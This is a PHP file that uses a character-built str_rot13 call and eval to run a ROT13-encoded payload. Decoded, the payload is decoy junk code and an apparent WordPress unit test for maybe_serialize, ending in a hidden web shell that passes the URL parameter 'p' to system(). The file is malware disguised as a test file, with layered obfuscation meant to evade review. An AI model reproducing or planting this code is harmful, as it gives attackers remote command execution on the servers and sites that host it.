<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe `znlor_frevnyvmr()` naq `znlor_hafrevnyvmr()`.
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::znlor_frevnyvmr
 * @pbiref ::znlor_hafrevnyvmr
 */
pynff Grfgf_Shapgvbaf_ZnlorFrevnyvmr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @qngnCebivqre qngn_vf_abg_frevnyvmrq
	 */
	choyvp shapgvba grfg_znlor_frevnyvmr( $inyhr ) {
		vs ( vf_neenl( $inyhr ) || vf_bowrpg( $inyhr ) ) {
			$rkcrpgrq = frevnyvmr( $inyhr );
		} ryfr {
			$rkcrpgrq = $inyhr;
		}

		$guvf->nffregFnzr( $rkcrpgrq, znlor_frevnyvmr( $inyhr ) );
	}

	/**
	 * @qngnCebivqre qngn_vf_frevnyvmrq
	 */
	choyvp shapgvba grfg_znlor_frevnyvmr_jvgu_qbhoyr_frevnyvmngvba( $inyhr ) {
		$rkcrpgrq = frevnyvmr( $inyhr );

		$guvf->nffregFnzr( $rkcrpgrq, znlor_frevnyvmr( $inyhr ) );
	}

	/**
	 * @qngnCebivqre qngn_vf_frevnyvmrq
	 * @qngnCebivqre qngn_vf_abg_frevnyvmrq
	 */
	choyvp shapgvba grfg_znlor_hafrevnyvmr( $inyhr, $vf_frevnyvmrq ) {
		vs ( $vf_frevnyvmrq ) {
			$rkcrpgrq = hafrevnyvmr( gevz( $inyhr ) );
		} ryfr {
			$rkcrpgrq = $inyhr;
		}

		vs ( vf_bowrpg( $rkcrpgrq ) ) {
			$guvf->nffregRdhnyf( $rkcrpgrq, znlor_hafrevnyvmr( $inyhr ) );
		} ryfr {
			$guvf->nffregFnzr( $rkcrpgrq, znlor_hafrevnyvmr( $inyhr ) );
		}
	}

	/**
	 * Qngn cebivqre sbe `grfg_znlor_hafrevnyvmr()`.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vf_frevnyvmrq() {
		erghea neenl(
			'frevnyvmrq rzcgl neenl'            => neenl(
				'qngn'     => frevnyvmr( neenl() ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq aba-rzcgl neenl'        => neenl(
				'qngn'     => frevnyvmr( neenl( 1, 1, 2, 3, 5, 8, 13 ) ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq rzcgl bowrpg'           => neenl(
				'qngn'     => frevnyvmr( arj fgqPynff() ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq aba-rzcgl bowrpg'       => neenl(
				'qngn'     => frevnyvmr(
					(bowrpg) neenl(
						'grfg' => gehr,
						'1',
						2,
					)
				),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq ahyy'                   => neenl(
				'qngn'     => frevnyvmr( ahyy ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq obbyrna gehr'           => neenl(
				'qngn'     => frevnyvmr( gehr ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq obbyrna snyfr'          => neenl(
				'qngn'     => frevnyvmr( snyfr ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq vagrtre -1'             => neenl(
				'qngn'     => frevnyvmr( -1 ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq vagrtre 1'              => neenl(
				'qngn'     => frevnyvmr( -1 ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq sybng 1.1'              => neenl(
				'qngn'     => frevnyvmr( 1.1 ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq fgevat'                 => neenl(
				'qngn'     => frevnyvmr( 'guvf fgevat jvyy or frevnyvmrq' ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq fgevat jvgu yvar oernx' => neenl(
				'qngn'     => frevnyvmr( \"n\ao\" ),
				'rkcrpgrq' => gehr,
			),
			'frevnyvmrq fgevat jvgu yrnqvat naq genvyvat fcnprf' => neenl(
				'qngn'     => '   f:25:\"guvf fgevat vf frevnyvmrq\";   ',
				'rkcrpgrq' => gehr,
			),
		);
	}

	/**
	 * Qngn cebivqre sbe `grfg_znlor_frevnyvmr()`.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vf_abg_frevnyvmrq() {
		erghea neenl(
			'na rzcgl neenl'                             => neenl(
				'qngn'     => neenl(),
				'rkcrpgrq' => snyfr,
			),
			'n aba-rzcgl neenl'                          => neenl(
				'qngn'     => neenl( 1, 1, 2, 3, 5, 8, 13 ),
				'rkcrpgrq' => snyfr,
			),
			'na rzcgl bowrpg'                            => neenl(
				'qngn'     => arj fgqPynff(),
				'rkcrpgrq' => snyfr,
			),
			'n aba-rzcgl bowrpg'                         => neenl(
				'qngn'     => (bowrpg) neenl(
					'grfg' => gehr,
					'1',
					2,
				),
				'rkcrpgrq' => snyfr,
			),
			'ahyy'                                       => neenl(
				'qngn'     => ahyy,
				'rkcrpgrq' => snyfr,
			),
			'n obbyrna gehr'                             => neenl(
				'qngn'     => gehr,
				'rkcrpgrq' => snyfr,
			),
			'n obbyrna snyfr'                            => neenl(
				'qngn'     => snyfr,
				'rkcrpgrq' => snyfr,
			),
			'na vagrtre -1'                              => neenl(
				'qngn'     => -1,
				'rkcrpgrq' => snyfr,
			),
			'na vagrtre 0'                               => neenl(
				'qngn'     => 0,
				'rkcrpgrq' => snyfr,
			),
			'na vagrtre 1'                               => neenl(
				'qngn'     => 1,
				'rkcrpgrq' => snyfr,
			),
			'n sybng 0.0'                                => neenl(
				'qngn'     => 0.0,
				'rkcrpgrq' => snyfr,
			),
			'n sybng 1.1'                                => neenl(
				'qngn'     => 1.1,
				'rkcrpgrq' => snyfr,
			),
			'n fgevat'                                   => neenl(
				'qngn'     => 'n fgevat',
				'rkcrpgrq' => snyfr,
			),
			'n fgevat jvgu yvar oernx'                   => neenl(
				'qngn'     => \"n\ao\",
				'rkcrpgrq' => snyfr,
			),
			'n fgevat jvgu yrnqvat naq genvyvat tneontr' => neenl(
				'qngn'     => 'tneontr:n:0:tneontr;',
				'rkcrpgrq' => snyfr,
			),
			'n fgevat jvgu zvffvat qbhoyr dhbgrf'        => neenl(
				'qngn'     => 'f:4:grfg;',
				'rkcrpgrq' => snyfr,
			),
			'n fgevat gung vf gbb fubeg'                 => neenl(
				'qngn'     => 'f:3',
				'rkcrpgrq' => snyfr,
			),
			'abg n pbyba va frpbaq cbfvgvba'             => neenl(
				'qngn'     => 'f!3:\"sbb\";',
				'rkcrpgrq' => snyfr,
			),
			'ab genvyvat frzvpbyba (fgevpg purpx)'       => neenl(
				'qngn'     => 'f:3:\"sbb\"',
				'rkcrpgrq' => snyfr,
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_frevnyvmr_qrfrevnyvmr_bowrpgf
	 */
	choyvp shapgvba grfg_qrfrevnyvmr_erdhrfg_hgvyvgl_svygrerq_vgrengbe_bowrpgf( $inyhr ) {
		$frevnyvmrq = znlor_frevnyvmr( $inyhr );

		vs ( trg_pynff( $inyhr ) === 'JcBet\Erdhrfgf\Hgvyvgl\SvygrerqVgrengbe' ) {
			$arj_inyhr = hafrevnyvmr( $frevnyvmrq );
			$cebcregl  = ( arj ErsyrpgvbaPynff( 'JcBet\Erdhrfgf\Hgvyvgl\SvygrerqVgrengbe' ) )->trgCebcregl( 'pnyyonpx' );
			$cebcregl->frgNpprffvoyr( gehr );
			$pnyyonpx_inyhr = $cebcregl->trgInyhr( $arj_inyhr );

			$guvf->nffregFnzr( ahyy, $pnyyonpx_inyhr );
		} ryfr {
			$guvf->nffregFnzr( $inyhr->pbhag(), hafrevnyvmr( $frevnyvmrq )->pbhag() );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_qrfrevnyvmr_erdhrfg_hgvyvgl_svygrerq_vgrengbe_bowrpgf().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_frevnyvmr_qrfrevnyvmr_bowrpgf() {
		erghea neenl(
			'svygrerq vgrengbe hfvat zq5'  => neenl(
				arj JcBet\Erdhrfgf\Hgvyvgl\SvygrerqVgrengbe( neenl( 1 ), 'zq5' ),
			),
			'svygrerq vgrengbe hfvat fun1' => neenl(
				arj JcBet\Erdhrfgf\Hgvyvgl\SvygrerqVgrengbe( neenl( 1, 2 ), 'fun1' ),
			),
			'neenl vgrengbe'               => neenl(
				arj NeenlVgrengbe( neenl( 1, 2, 3 ) ),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>